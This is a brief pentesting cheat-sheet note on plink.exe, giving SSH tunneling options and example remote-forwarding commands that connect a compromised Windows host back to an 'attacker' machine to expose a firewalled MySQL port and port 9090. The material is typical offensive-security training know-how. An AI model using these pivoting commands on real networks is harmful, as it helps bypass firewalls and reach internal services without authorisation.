---
title: plink.exe
date: M02-12-2023
author: i4
---

## Tunneling
```
  -D [listen-IP:]listen-port
            Dynamic SOCKS-based port forwarding
  -L [listen-IP:]listen-port:host:port
            Forward local port to remote address
  -R [listen-IP:]listen-port:host:port
            Forward remote port to local address
```

### Service running on remote machine connect back to attacker
```
C:\> plink.exe -ssh -l [user] -pw [password] -R [listen-IP:]listen-port:[local-IP]:[Local-Port] 
```

#### Example
- MYSQL runs on windows host (3306/TCP)
- Firewall **blocks** 3306/TCP to any outside host
```
plink.exe -ssh -l attacker -pw password -R 3306:127.0.0.1:3306 [remote-IP]
```

This makes (3306/TCP) available over SSH to `[remote-ip]`

```
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
